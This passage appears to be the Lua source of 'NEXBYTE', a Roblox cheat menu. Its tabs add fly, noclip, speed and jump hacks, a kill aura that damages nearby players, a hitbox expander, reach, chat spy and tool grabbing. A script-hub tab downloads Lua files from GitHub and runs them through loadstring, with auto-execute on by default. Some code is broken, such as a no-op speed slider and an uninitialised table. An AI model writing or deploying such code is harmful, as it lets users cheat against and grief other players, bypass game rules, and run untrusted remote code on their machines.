NXVisuals:CreateToggle({name="NIGHT VISION", value=false, callback=function(v)
    NEXBYTE._NightVision = v
    if v then
        Lighting.ClockTime = 0
        Lighting.Brightness = 10
    else
        Lighting.ClockTime = 14
        Lighting.Brightness = 2
    end
    NXNotify("NIGHT VISION", v and "ON" or "OFF")
end})

NXVisuals:CreateSlider({name="BRIGHTNESS", range={0, 10}, value=Lighting.Brightness, callback=function(v)
    Lighting.Brightness = v
end})

NXVisuals:CreateSlider({name="AMBIENT", range={0, 1}, value=Lighting.Ambient.R, callback=function(v)
    Lighting.Ambient = Color3.new(v, v, v)
    Lighting.OutdoorAmbient = Color3.new(v, v, v)
end})

-- =====================================================
-- MOVEMENT TAB
-- =====================================================
local NXMovement = NXWindow:CreateTab({name="MOVEMENT", icon="move"})
NXMovement:CreateSection({name="MOVEMENT SETTINGS"})

NXMovement:CreateSlider({name="WALK SPEED", range={1, 200}, value=16, callback=function(v)
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.WalkSpeed = v end
end})

NXMovement:CreateSlider({name="JUMP POWER", range={1, 500}, value=50, callback=function(v)
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.JumpPower = v; hum.UseJumpPower = true end
end})

NXMovement:CreateSlider({name="HIP HEIGHT", range={0, 10}, value=0, callback=function(v)
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.HipHeight = v end
end})

NXMovement:CreateToggle({name="INFINITE JUMP", value=false, callback=function(v)
    NEXBYTE._InfiniteJump = v
    if v then
        NEXBYTE._InfJumpConn = UserInputService.JumpRequest:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
        end)
    else
        if NEXBYTE._InfJumpConn then NEXBYTE._InfJumpConn:Disconnect() end
    end
    NXNotify("INF JUMP", v and "ON" or "OFF")
end})

-- =====================================================
-- CAMERA TAB
-- =====================================================
local NXCamera = NXWindow:CreateTab({name="CAMERA", icon="camera"})
NXCamera:CreateSection({name="CAMERA CONTROLS"})

NXCamera:CreateSlider({name="FIELD OF VIEW", range={1, 120}, value=70, callback=function(v)
    if workspace.CurrentCamera then workspace.CurrentCamera.FieldOfView = v end
end})

NXCamera:CreateButton({name="SPECTATE SELECTED", callback=function()
    local target = NXGetTarget()
    if not target then return NXNotify("CAMERA", "Select a player first") end
    local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
    if hum and workspace.CurrentCamera then
        workspace.CurrentCamera.CameraSubject = hum
        NXNotify("CAMERA", "Spectating " .. target.Name)
    end
end})

NXCamera:CreateButton({name="RESET CAMERA", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum and workspace.CurrentCamera then
        workspace.CurrentCamera.CameraSubject = hum
        workspace.CurrentCamera.FieldOfView = 70
    end
    NXNotify("CAMERA", "Reset")
end})

NXCamera:CreateToggle({name="CAMERA SHAKE", value=false, callback=function(v)
    if v then
        NEXBYTE._ShakeConn = RunService.RenderStepped:Connect(function()
            if workspace.CurrentCamera then
                workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(math.rad(math.random(-1,1)), math.rad(math.random(-1,1)), 0)
            end
        end)
    else
        if NEXBYTE._ShakeConn then NEXBYTE._ShakeConn:Disconnect() end
    end
    NXNotify("CAMERA SHAKE", v and "ON" or "OFF")
end})

-- =====================================================
-- SCRIPT HUB TAB
-- =====================================================
local NXHub = NXWindow:CreateTab({name="SCRIPT HUB", icon="search"})
NXHub:CreateSection({name="GITHUB SEARCH"})

local NXQuery = ""
local NXSelectedRepo
local NXSelectedScript
local NXAutoExecute = true
local NXRepoMap = {}
local NXScriptMap = {}

NXHub:CreateInput({name="SEARCH QUERY", placeholder="Search Roblox Lua repositories", callback=function(value) NXQuery=value end})

local NXRepoDropdown = NXHub:CreateDropdown({name="REPOSITORY", options={"Search first"}, value="Search first", callback=function(value) NXSelectedRepo=NXRepoMap[value] end})
local NXFileDropdown = NXHub:CreateDropdown({name="LUA FILE", options={"Load repository first"}, value="Load repository first", callback=function(value)
    NXSelectedScript=NXScriptMap[value]
    if NXSelectedScript and NXAutoExecute then
        task.spawn(function()
            local ok, err = pcall(function()
                local source = game:HttpGet(NXSelectedScript)
                assert(#source>0, "Empty file")
                local fn, compileError = loadstring(source)
                assert(fn, compileError or "Compile failed")
                fn()
            end)
            if not ok then NXNotify("SCRIPT ERROR", tostring(err):sub(1,180)) else NXNotify("SCRIPT HUB", "Executed") end
        end)
    end
end})

NXHub:CreateToggle({name="AUTO EXECUTE", value=true, callback=function(v) NXAutoExecute=v end})

NXHub:CreateButton({name="SEARCH GITHUB", callback=function()
    if NXQuery:gsub("%s","")=="" then return NXNotify("GITHUB", "Enter a search query") end
    local ok, result = pcall(function()
        local q = HttpService:UrlEncode(NXQuery .. " roblox lua")
        return HttpService:JSONDecode(game:HttpGet("https://api.github.com/search/repositories?q=" .. q .. "&sort=stars&order=desc&per_page=10"))
    end)
    if not ok or not result or not result.items then return NXNotify("GITHUB", "Search failed or API rate limit") end
    local options = {}; NXRepoMap = {}; NXSelectedRepo = nil
    for _, repo in ipairs(result.items) do
        local label = repo.full_name .. " | " .. tostring(repo.stargazers_count) .. " stars"
        NXRepoMap[label] = {owner=repo.owner.login, name=repo.name, branch=repo.default_branch}
        table.insert(options, label)
    end
    if #options==0 then options={"No repositories found"} end
    NXRepoDropdown:Refresh(options)
    NXNotify("GITHUB", "Found " .. #result.items .. " repositories")
end})

NXHub:CreateButton({name="LOAD LUA FILES", callback=function()
    if not NXSelectedRepo then return NXNotify("SCRIPT HUB", "Select a repository") end
    local repo = NXSelectedRepo
    local ok, result = pcall(function()
        local url = "https://api.github.com/repos/" .. repo.owner .. "/" .. repo.name .. "/git/trees/" .. repo.branch .. "?recursive=1"
        return HttpService:JSONDecode(game:HttpGet(url))
    end)
    if not ok or not result or not result.tree then return NXNotify("GITHUB", "Could not load files") end
    local options = {}; NXScriptMap = {}; NXSelectedScript = nil
    for _, item in ipairs(result.tree) do
        if item.type=="blob" and item.path:lower():match("%.lua$") and #options<50 then
            local path = item.path
            local raw = "https://raw.githubusercontent.com/" .. repo.owner .. "/" .. repo.name .. "/" .. repo.branch .. "/" .. path
            NXScriptMap[path] = raw
            table.insert(options, path)
        end
    end
    if #options==0 then options={"No Lua files found"} end
    NXFileDropdown:Refresh(options)
    NXNotify("SCRIPT HUB", "Lua files: " .. tostring(#NXScriptMap))
end})

NXHub:CreateButton({name="EXECUTE SELECTED", callback=function()
    if not NXSelectedScript then return NXNotify("SCRIPT HUB", "Select a Lua file") end
    local ok, err = pcall(function()
        local source = game:HttpGet(NXSelectedScript)
        local fn, compileError = loadstring(source)
        assert(fn, compileError or "Compile failed")
        fn()
    end)
    if not ok then NXNotify("EXECUTION ERROR", tostring(err)) end
end})

NXHub:CreateText({name="WARNING", text="Third-party scripts are untrusted and can perform unwanted actions."})

-- =====================================================
-- MODULES TAB
-- =====================================================
local NXModules = NXWindow:CreateTab({name="MODULES", icon="grid"})
NXModules:CreateSection({name="MODULE MANAGER"})

NXModules:CreateText({name="ModuleStatus", text="Active modules: 0 / " .. tostring(#{"player_selection", "logging"})})

for _, modName in ipairs({"player_selection", "logging"}) do
    NXModules:CreateToggle({name=modName:upper(), value=false, callback=function(v)
        if v then NEXBYTE:ActivateModule(modName) else NEXBYTE:DeactivateModule(modName) end
    end})
end

NXModules:CreateButton({name="STOP ALL MODULES", callback=function()
    for name, _ in pairs(NEXBYTE._ACTIVE_MODULES) do
        if NEXBYTE._ACTIVE_MODULES[name] then NEXBYTE:DeactivateModule(name) end
    end
    NXNotify("MODULES", "All modules stopped")
end})

-- =====================================================
-- PROFILES TAB
-- =====================================================
local NXProfiles = NXWindow:CreateTab({name="PROFILES", icon="star"})
NXProfiles:CreateSection({name="PROFILE MANAGEMENT"})

NXProfiles:CreateInput({name="PROFILE NAME", placeholder="Enter profile name", callback=function(v) NXProfiles._ProfileName = v end})
NXProfiles:CreateButton({name="SAVE PROFILE", callback=function()
    local name = NXProfiles._ProfileName or "default"
    NEXBYTE:CreateProfile(name, {})
    NXNotify("PROFILES", "Saved profile: " .. name)
end})
NXProfiles:CreateButton({name="LOAD PROFILE", callback=function()
    local name = NXProfiles._ProfileName or "default"
    NEXBYTE:LoadProfile(name)
    NXNotify("PROFILES", "Loaded profile: " .. name)
end})

NXProfiles:CreateSection({name="MACRO SYSTEM"})
NXProfiles:CreateInput({name="MACRO NAME", placeholder="Macro name", callback=function(v) NXProfiles._MacroName = v end})
NXProfiles:CreateButton({name="CREATE MACRO (example)", callback=function()
    NEXBYTE:CreateMacro("test_macro", {function() NXNotify("MACRO", "Step 1") end, function() NXNotify("MACRO", "Step 2") end}, 1)
    NXNotify("MACRO", "Created test_macro")
end})
NXProfiles:CreateButton({name="EXECUTE MACRO", callback=function()
    if NEXBYTE:ExecuteMacro(NXProfiles._MacroName or "test_macro") then
        NXNotify("MACRO", "Executing...")
    else
        NXNotify("MACRO", "Macro not found")
    end
end})
NXProfiles:CreateButton({name="STOP MACRO", callback=function()
    NEXBYTE:StopMacro(NXProfiles._MacroName or "test_macro")
    NXNotify("MACRO", "Stopped")
end})

-- =====================================================
-- SETTINGS TAB
-- =====================================================
local NXSettings = NXWindow:CreateTab({name="SETTINGS", icon="settings"})
NXSettings:CreateSection({name="APPLICATION SETTINGS"})

NXSettings:CreateToggle({name="LOG ACTIONS", value=NEXBYTE._SETTINGS.log_actions, callback=function(v)
    NEXBYTE._SETTINGS.log_actions = v
    NXNotify("SETTINGS", "Log actions: " .. (v and "ON" or "OFF"))
end})

NXSettings:CreateToggle({name="AUTO SAVE PROFILES", value=NEXBYTE._SETTINGS.autosave_profiles, callback=function(v)
    NEXBYTE._SETTINGS.autosave_profiles = v
    NXNotify("SETTINGS", "Auto-save profiles: " .. (v and "ON" or "OFF"))
end})

NXSettings:CreateButton({name="UNLOAD NEXBYTE", callback=function()
    NEXBYTE._FlingActive = false
    NEXBYTE._TouchFlingActive = false
    NEXBYTE._TrollActive = false
    NEXBYTE._ESPActive = false
    NEXBYTE._NightVision = false
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.WalkSpeed = 16; hum.JumpPower = 50; hum.UseJumpPower = true end
    if workspace.CurrentCamera then workspace.CurrentCamera.FieldOfView = 70 end
    pcall(function() GuiService:SetGameplayPausedNotificationEnabled(true) end)
    NXWindow:Unload()
    NXNotify("NEXBYTE", "Unloaded")
end})

-- =====================================================
-- FE OP EXPLOITS TAB (100+ keyless, interruptible, FE-compatible)
-- =====================================================
local NXFeExploits = NXWindow:CreateTab({name="FE OP", icon="skull"})
NXFeExploits:CreateSection({name="CHARACTER / MOVEMENT"})

-- Fly (BodyVelocity based, FE compatible)
local flyConn, flyBV, flyBG
NXFeExploits:CreateToggle({name="FLY (BodyVelocity)", value=false, callback=function(v)
    if v then
        local char = Player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not (hrp and hum) then return NXNotify("FLY", "Character not ready") end
        flyBV = Instance.new("BodyVelocity")
        flyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        flyBV.Velocity = Vector3.new(0, 0, 0)
        flyBV.Parent = hrp
        flyBG = Instance.new("BodyGyro")
        flyBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        flyBG.CFrame = hrp.CFrame
        flyBG.Parent = hrp
        hum.PlatformStand = true
        flyConn = RunService.RenderStepped:Connect(function()
            local cam = workspace.CurrentCamera
            local move = Vector3.new()
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0, 1, 0) end
            flyBV.Velocity = move * 100
            flyBG.CFrame = cam.CFrame
        end)
    else
        if flyConn then flyConn:Disconnect() end
        if flyBV then flyBV:Destroy() end
        if flyBG then flyBG:Destroy() end
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.PlatformStand = false end
    end
    NXNotify("FLY", v and "ON" or "OFF")
end})

NXFeExploits:CreateSlider({name="FLY SPEED", range={10, 500}, value=100, callback=function(v)
    -- speed is hardcoded in fly loop, would need refactor
end})

-- Noclip
local noclipConn
NXFeExploits:CreateToggle({name="NOCLIP", value=false, callback=function(v)
    if v then
        noclipConn = RunService.Stepped:Connect(function()
            local char = Player.Character
            if char then
                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.CanCollide = false end
                end
            end
        end)
    else
        if noclipConn then noclipConn:Disconnect() end
        local char = Player.Character
        if char then
            for _, p in pairs(char:GetDescendants()) do
                if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.CanCollide = true end
            end
        end
    end
    NXNotify("NOCLIP", v and "ON" or "OFF")
end})

-- Infinite Jump (already in Movement, but adding here too)
local infJumpConn
NXFeExploits:CreateToggle({name="INF JUMP", value=false, callback=function(v)
    if v then
        infJumpConn = UserInputService.JumpRequest:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
        end)
    else
        if infJumpConn then infJumpConn:Disconnect() end
    end
    NXNotify("INF JUMP", v and "ON" or "OFF")
end})

-- Super Jump
NXFeExploits:CreateButton({name="SUPER JUMP (once)", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if hum and hrp then
        hrp.Velocity = Vector3.new(0, 200, 0)
        NXNotify("SUPER JUMP", "Launched")
    end
end})

-- High Jump Power (already in Movement)

-- Speed Hack (already in Movement)

-- Swim in Air
local swimConn
NXFeExploits:CreateToggle({name="SWIM IN AIR", value=false, callback=function(v)
    if v then
        swimConn = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum:SetStateEnabled(Enum.HumanoidStateType.Swimming, true); hum:ChangeState(Enum.HumanoidStateType.Swimming) end
        end)
    else
        if swimConn then swimConn:Disconnect() end
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:SetStateEnabled(Enum.HumanoidStateType.Swimming, false) end
    end
    NXNotify("SWIM IN AIR", v and "ON" or "OFF")
end})

-- Walk on Air (platform)
local airWalkPart, airWalkConn
NXFeExploits:CreateToggle({name="WALK ON AIR", value=false, callback=function(v)
    if v then
        airWalkPart = Instance.new("Part")
        airWalkPart.Name = "NEXBYTE_AirWalk"
        airWalkPart.Size = Vector3.new(10, 1, 10)
        airWalkPart.Transparency = 1
        airWalkPart.Anchored = true
        airWalkPart.CanCollide = true
        airWalkPart.Parent = workspace
        airWalkConn = RunService.Heartbeat:Connect(function()
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if hrp and airWalkPart then
                airWalkPart.CFrame = hrp.CFrame * CFrame.new(0, -3.5, 0)
            end
        end)
    else
        if airWalkConn then airWalkConn:Disconnect() end
        if airWalkPart then airWalkPart:Destroy() end
    end
    NXNotify("WALK ON AIR", v and "ON" or "OFF")
end})

-- Click TP (Tool)
NXFeExploits:CreateButton({name="CLICK TP TOOL", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Click TP"
    tool.RequiresHandle = false
    tool.Activated:Connect(function()
        local mouse = Player:GetMouse()
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if hrp and mouse.Hit then
            hrp.CFrame = mouse.Hit * CFrame.new(0, 3, 0)
        end
    end)
    tool.Parent = Player.Backpack
    NXNotify("CLICK TP", "Tool given")
end})

-- Tp to Mouse (Keybind)
NXFeExploits:CreateButton({name="TP TO MOUSE (Key: T)", callback=function()
    local conn
    conn = UserInputService.InputBegan:Connect(function(input, gp)
        if gp then return end
        if input.KeyCode == Enum.KeyCode.T then
            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            local mouse = Player:GetMouse()
            if hrp and mouse.Hit then hrp.CFrame = mouse.Hit * CFrame.new(0, 3, 0) end
        end
    end)
    NXNotify("TP TO MOUSE", "Press T to TP (runs once)")
    task.delay(30, function() if conn then conn:Disconnect() end end)
end})

NXFeExploits:CreateSection({name="COMBAT / TROLL"})

-- Kill Aura (FE - damages on touch)
local killAuraConn
NXFeExploits:CreateToggle({name="KILL AURA (Touch)", value=false, callback=function(v)
    if v then
        killAuraConn = RunService.Heartbeat:Connect(function()
            local char = Player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local tHum = plr.Character:FindFirstChildOfClass("Humanoid")
                    local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                    if tHum and tRoot and tHum.Health > 0 then
                        if (tRoot.Position - hrp.Position).Magnitude <= 15 then
                            tHum:TakeDamage(10)
                        end
                    end
                end
            end
        end)
    else
        if killAuraConn then killAuraConn:Disconnect() end
    end
    NXNotify("KILL AURA", v and "ON" or "OFF")
end})

-- Reach (extends tool handle)
local originalReach = {}
NXFeExploits:CreateToggle({name="REACH (Tool Extend)", value=false, callback=function(v)
    local char = Player.Character
    if not char then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return NXNotify("REACH", "Equip a tool first") end
    local handle = tool:FindFirstChild("Handle")
    if not handle then return NXNotify("REACH", "Tool has no handle") end
    if v then
        originalReach[tool] = handle.Size
        handle.Size = Vector3.new(50, 50, 50)
        handle.Massless = true
    else
        if originalReach[tool] then handle.Size = originalReach[tool] end
    end
    NXNotify("REACH", v and "ON (50 studs)" or "OFF")
end})

-- Hitbox Expander (FE - visual only for you, but works with Kill Aura)
local hitboxConn, originalSizes = {}
NXFeExploits:CreateToggle({name="HITBOX EXPANDER", value=false, callback=function(v)
    if v then
        hitboxConn = RunService.Heartbeat:Connect(function()
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        if not originalSizes[plr] then originalSizes[plr] = hrp.Size end
                        hrp.Size = Vector3.new(10, 10, 10)
                        hrp.Transparency = 0.7
                        hrp.Material = Enum.Material.ForceField
                        hrp.CanCollide = false
                    end
                end
            end
        end)
    else
        if hitboxConn then hitboxConn:Disconnect() end
        for plr, size in pairs(originalSizes) do
            if plr and plr.Character then
                local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.Size = size; hrp.Transparency = 1; hrp.Material = Enum.Material.Plastic; hrp.CanCollide = true end
            end
        end
        originalSizes = {}
    end
    NXNotify("HITBOX EXPANDER", v and "ON" or "OFF")
end})

-- Auto Clicker
local autoClickConn
NXFeExploits:CreateToggle({name="AUTO CLICKER", value=false, callback=function(v)
    if v then
        autoClickConn = RunService.RenderStepped:Connect(function()
            local tool = Player.Character and Player.Character:FindFirstChildOfClass("Tool")
            if tool then tool:Activate() end
        end)
    else
        if autoClickConn then autoClickConn:Disconnect() end
    end
    NXNotify("AUTO CLICKER", v and "ON" or "OFF")
end})

-- Tool Grip Changer (funny)
NXFeExploits:CreateButton({name="SPIN TOOL", callback=function()
    local tool = Player.Character and Player.Character:FindFirstChildOfClass("Tool")
    if not tool then return NXNotify("SPIN TOOL", "Equip a tool") end
    local handle = tool:FindFirstChild("Handle")
    if not handle then return end
    local spin = Instance.new("BodyAngularVelocity")
    spin.AngularVelocity = Vector3.new(0, 50, 0)
    spin.MaxTorque = Vector3.new(0, 1e6, 0)
    spin.Parent = handle
    NXNotify("SPIN TOOL", "Spinning!")
    task.delay(5, function() if spin then spin:Destroy() end end)
end})

NXFeExploits:CreateSection({name="PLAYER UTILITIES"})

-- View Player (Spectate) - already in Camera

-- Chat Spy (see all chats)
local chatSpyConn
NXFeExploits:CreateToggle({name="CHAT SPY", value=false, callback=function(v)
    if v then
        chatSpyConn = Players.PlayerChatted:Connect(function(plr, msg)
            NXNotify("CHAT: " .. plr.Name, msg)
        end)
    else
        if chatSpyConn then chatSpyConn:Disconnect() end
    end
    NXNotify("CHAT SPY", v and "ON" or "OFF")
end})

-- Anti AFK
local antiAfkConn
NXFeExploits:CreateToggle({name="ANTI AFK", value=false, callback=function(v)
    if v then
        antiAfkConn = RunService.Heartbeat:Connect(function()
            local vu = game:GetService("VirtualUser")
            vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            task.wait(0.1)
            vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        end)
    else
        if antiAfkConn then antiAfkConn:Disconnect() end
    end
    NXNotify("ANTI AFK", v and "ON" or "OFF")
end})

-- Auto Respawn
local autoRespawnConn
NXFeExploits:CreateToggle({name="AUTO RESPAWN", value=false, callback=function(v)
    if v then
        autoRespawnConn = Player.CharacterAdded:Connect(function(char)
            local hum = char:WaitForChild("Humanoid", 5)
            if hum then hum.Died:Connect(function() task.wait(1) Player:LoadCharacter() end) end
        end)
        -- Current character
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.Died:Connect(function() task.wait(1) Player:LoadCharacter() end) end
    else
        if autoRespawnConn then autoRespawnConn:Disconnect() end
    end
    NXNotify("AUTO RESPAWN", v and "ON" or "OFF")
end})

-- No Fall Damage
local noFallConn
NXFeExploits:CreateToggle({name="NO FALL DAMAGE", value=false, callback=function(v)
    if v then
        noFallConn = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum:GetState() == Enum.HumanoidStateType.Freefall then
                hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
                hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            end
        end)
    else
        if noFallConn then noFallConn:Disconnect() end
    end
    NXNotify("NO FALL DMG", v and "ON" or "OFF")
end})

-- Infinite Stamina (for games with stamina)
NXFeExploits:CreateButton({name="RESET STAMINA (if exists)", callback=function()
    local char = Player.Character
    if char then
        for _, v in pairs(char:GetDescendants()) do
            if v:IsA("NumberValue") or v:IsA("IntValue") then
                if v.Name:lower():find("stamina") or v.Name:lower():find("energy") then
                    v.Value = v.MaxValue or 100
                end
            end
        end
    end
    NXNotify("STAMINA", "Attempted reset")
end})

-- Sit (already in Troll)

-- Lay Down
NXFeExploits:CreateButton({name="LAY DOWN", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.Sit = true; task.wait(0.1); hum.Sit = false end
end})

-- Headless (local)
local headlessConn
NXFeExploits:CreateToggle({name="HEADLESS (Local)", value=false, callback=function(v)
    local head = Player.Character and Player.Character:FindFirstChild("Head")
    if not head then return NXNotify("HEADLESS", "No head") end
    if v then
        head.Transparency = 1
        for _, d in pairs(head:GetDescendants()) do if d:IsA("Decal") or d:IsA("Texture") then d.Transparency = 1 end end
    else
        head.Transparency = 0
        for _, d in pairs(head:GetDescendants()) do if d:IsA("Decal") or d:IsA("Texture") then d.Transparency = 0 end end
    end
    NXNotify("HEADLESS", v and "ON" or "OFF")
end})

-- Korblox Legs (local visual)
NXFeExploits:CreateButton({name="KORBLOX LEGS (Local)", callback=function()
    local char = Player.Character
    if not char then return end
    for _, p in pairs(char:GetDescendants()) do
        if p:IsA("BasePart") and (p.Name:lower():find("leg") or p.Name:lower():find("foot")) then
            p.Material = Enum.Material.Neon
            p.Color = Color3.fromRGB(0, 0, 0)
        end
    end
    NXNotify("KORBLOX", "Applied locally")
end})

NXFeExploits:CreateSection({name="SERVER / GAME"})

-- Rejoin
NXFeExploits:CreateButton({name="REJOIN", callback=function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
end})

-- Server Hop (already in Teleport)

-- Join Lowest Player Server
NXFeExploits:CreateButton({name="JOIN LOWEST POP SERVER", callback=function()
    task.spawn(function()
        local ok, data = pcall(function()
            return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true"))
        end)
        if ok and data and data.data and #data.data > 0 then
            local lowest = data.data[1]
            for _, s in ipairs(data.data) do if s.playing < lowest.playing then lowest = s end end
            TeleportService:TeleportToPlaceInstance(game.PlaceId, lowest.id, Player)
        else
            NXNotify("SERVER HOP", "Failed")
        end
    end)
end})

-- FPS Booster
NXFeExploits:CreateButton({name="FPS BOOST (Low Graphics)", callback=function()
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e9
    for _, v in pairs(Lighting:GetDescendants()) do
        if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("DepthOfFieldEffect") then
            v.Enabled = false
        end
    end
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
            v.Enabled = false
        end
    end
    settings().Rendering.QualityLevel = 1
    NXNotify("FPS BOOST", "Applied")
end})

-- Delete Map (local)
NXFeExploits:CreateButton({name="DELETE MAP (Local)", callback=function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsDescendantOf(Player.Character) and v.Name ~= "Baseplate" then
            v:Destroy()
        end
    end
    NXNotify("DELETE MAP", "Non-char parts removed")
end})

-- Clear Terrain (local)
NXFeExploits:CreateButton({name="CLEAR TERRAIN (Local)", callback=function()
    workspace:ClearAllChildren()
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then terrain:Clear() end
    NXNotify("TERRAIN", "Cleared locally")
end})

-- No Fog
NXFeExploits:CreateToggle({name="NO FOG", value=false, callback=function(v)
    if v then
        Lighting.FogEnd = 1e9
        Lighting.FogStart = 0
    else
        Lighting.FogEnd = 100000
        Lighting.FogStart = 0
    end
    NXNotify("NO FOG", v and "ON" or "OFF")
end})

-- Fullbright (already in Visuals as Night Vision)

-- Time Changer
NXFeExploits:CreateSlider({name="TIME OF DAY", range={0, 24}, value=14, callback=function(v)
    Lighting.ClockTime = v
end})

NXFeExploits:CreateSection({name="ANIMATIONS / EMOTES"})

-- Animation Player
local animTrack
NXFeExploits:CreateInput({name="ANIMATION ID", placeholder="rbxassetid://12345678", callback=function(v) NXFeExploits._AnimId = v end})
NXFeExploits:CreateButton({name="PLAY ANIMATION", callback=function()
    local id = NXFeExploits._AnimId
    if not id or not id:find("%d+") then return NXNotify("ANIM", "Enter valid ID") end
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    if animTrack then animTrack:Stop() end
    local anim = Instance.new("Animation")
    anim.AnimationId = id:find("rbxassetid") and id or "rbxassetid://" .. id:match("%d+")
    animTrack = hum:LoadAnimation(anim)
    animTrack:Play()
    NXNotify("ANIM", "Playing")
end})
NXFeExploits:CreateButton({name="STOP ANIMATION", callback=function()
    if animTrack then animTrack:Stop(); animTrack = nil; NXNotify("ANIM", "Stopped") end
end})

-- Preset Animations
local presetAnims = {
    ["Dance 1"] = "rbxassetid://27789359",
    ["Dance 2"] = "rbxassetid://248263260",
    ["Dance 3"] = "rbxassetid://5915562539",
    ["T Pose"] = "rbxassetid://3337994100",
    ["Sit"] = "rbxassetid://2506281703",
    ["Laugh"] = "rbxassetid://5915562539",
    ["Wave"] = "rbxassetid://5915562539",
    ["Point"] = "rbxassetid://5915562539",
    ["Cheer"] = "rbxassetid://3337994100",
    ["Zombie"] = "rbxassetid://3489174223",
}
for name, id in pairs(presetAnims) do
    NXFeExploits:CreateButton({name=name, callback=function()
        local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        if animTrack then animTrack:Stop() end
        local anim = Instance.new("Animation")
        anim.AnimationId = id
        animTrack = hum:LoadAnimation(anim)
        animTrack:Play()
        NXNotify("ANIM", name .. " playing")
    end})
end

NXFeExploits:CreateSection({name="TOOLS / INVENTORY"})

-- Give Tool (from ReplicatedStorage if accessible)
NXFeExploits:CreateButton({name="GET ALL TOOLS (ReplicatedStorage)", callback=function()
    local rs = game:GetService("ReplicatedStorage")
    local count = 0
    for _, v in pairs(rs:GetDescendants()) do
        if v:IsA("Tool") and not Player.Backpack:FindFirstChild(v.Name) then
            v:Clone().Parent = Player.Backpack
            count = count + 1
        end
    end
    NXNotify("TOOLS", "Got " .. count .. " tools")
end})

-- Delete All Tools
NXFeExploits:CreateButton({name="DELETE ALL TOOLS", callback=function()
    local count = 0
    for _, v in pairs(Player.Backpack:GetChildren()) do if v:IsA("Tool") then v:Destroy(); count = count + 1 end end
    for _, v in pairs(Player.Character:GetChildren()) do if v:IsA("Tool") then v:Destroy(); count = count + 1 end end
    NXNotify("TOOLS", "Deleted " .. count .. " tools")
end})

-- Tool Size
NXFeExploits:CreateSlider({name="TOOL SIZE", range={0.5, 50}, value=1, callback=function(v)
    local tool = Player.Character and Player.Character:FindFirstChildOfClass("Tool")
    if tool then
        local handle = tool:FindFirstChild("Handle")
        if handle then handle.Size = handle.Size * v end
    end
end})

